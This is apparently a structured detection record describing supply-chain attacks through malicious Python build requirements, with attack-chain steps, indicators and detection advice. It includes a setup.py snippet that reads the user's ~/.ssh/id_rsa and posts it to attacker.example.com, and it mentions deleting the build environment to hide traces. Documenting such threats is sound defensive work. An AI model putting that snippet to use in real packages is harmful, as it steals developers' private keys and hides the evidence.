package_info.package_name: cryptography (example, but applies to any package with build requirements as source distributions)
package_info.package_versions: Any version where build requirements are resolved as source distributions
package_info.why_malicious: If any build requirement is a malicious source distribution, arbitrary code can be executed in an isolated build environment during package installation, bypassing lockfile review and standard dependency scanning. This creates a blind spot for supply chain attacks.

execution_context.file_location: setup.py (of a malicious build requirement package)

malicious_snippets.code_snippet:
import os
import requests
with open(os.path.expanduser('~/.ssh/id_rsa')) as f:
    key = f.read()
requests.post('https://attacker.example.com/steal', data={'key': key})
malicious_snippets.code_behavior: At build-time, the code reads the user's private SSH key from ~/.ssh/id_rsa and exfiltrates it via HTTPS POST to a hardcoded attacker-controlled domain, enabling credential theft.

malice_analysis.why_suspicious: Accessing sensitive files and exfiltrating them to an external server is a classic sign of malicious activity.
malice_analysis.violated_expectations: Build requirements should only perform actions necessary for building the package, not access or transmit user secrets.
malice_analysis.similar_legitimate_use: Legitimate build scripts may download dependencies or check environment variables, but should never exfiltrate secrets.
key_indicators: Execution in setup.py or build scripts

execution_context.trigger: build-time (when setup_requires or build-system.requires is resolved)

malicious_snippets.code_behavior: At build-time, the code deletes the temporary build environment directory after execution, removing traces of its activity.

malice_analysis.why_suspicious: Deleting the build environment is an anti-forensics technique to cover up malicious actions.
malice_analysis.violated_expectations: Build scripts should not perform cleanup outside their own scope or attempt to erase evidence.
malice_analysis.similar_legitimate_use: Some build scripts may clean up temporary files, but not entire environments.
key_indicators: Explicit deletion of build environment directories

attack_chain.action: Malicious build requirement is specified in build-system.requires or setup_requires.
attack_chain.leads_to: Malicious code is fetched and executed in isolated build environment.

attack_chain.action: Malicious code in setup.py executes during build, accessing sensitive files and exfiltrating data.
attack_chain.leads_to: Sensitive data is sent to attacker-controlled infrastructure.

attack_chain.action: Malicious code deletes build environment to cover tracks.
attack_chain.leads_to: Forensic evidence is removed, making detection harder.

behavioral_signatures: Execution of arbitrary code during build-time in isolated environments
Network requests from build scripts to external domains
Access to sensitive files (e.g., SSH keys, environment variables) during build
Immediate deletion of build environment or temporary files after build
file_indicators: setup.py with suspicious code in build requirements
pyproject.toml with unexpected or unreviewed build-system.requires entries
setup.cfg with [options] setup_requires key referencing unknown packages
network_indicators: Outbound HTTP/HTTPS requests from build environments to untrusted domains
Unusual DNS lookups or connections during package installation
detection_knowledge.how_to_detect: Monitor for execution of code in setup.py or build backends during package installation, especially when source distributions are used. Flag any build-time network activity or access to sensitive files. Audit build-system.requires and setup_requires for unexpected or unreviewed packages. Prefer tools that include build requirements in lockfiles (e.g., pip-compile with --all-build-deps) and disallow source distributions where possible.
